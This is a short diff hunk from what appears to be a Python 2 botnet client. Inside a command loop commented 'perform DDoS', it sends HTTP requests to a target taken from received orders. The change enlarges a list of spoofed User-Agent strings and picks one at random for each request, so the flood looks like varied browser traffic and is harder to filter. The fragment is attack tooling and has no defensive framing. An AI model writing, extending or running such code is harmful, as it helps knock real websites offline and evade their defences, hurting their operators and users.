@@ -69,7 +69,7 @@ while(True):
                         else:
                                 target = orders[1]
                                 # perform DDoS
-                                differentBrowsers = ["Mozilla/5.0 Firefox/35.0", "Safari", "Chrome/40.0.2214.115", "MSIE 7.0"]
+                                differentBrowsers = ["Mozilla/5.0 Firefox/35.0", "Safari", "Chrome/40.0.2214.115", "MSIE 7.0", "MSIE 6.0", "MSIE 8.0", "Mozilla/5.0 Firefox/33.0", "Mozilla/5.0 Firefox/37.0", "Iceweasel", "Orca", "Opera"]
                                 browserSelect = randint(0, len(differentBrowsers)-1)
                                 req = urllib2.Request(target, headers={'User-Agent':differentBrowsers[browserSelect]})
                                 urllib2.urlopen(req)
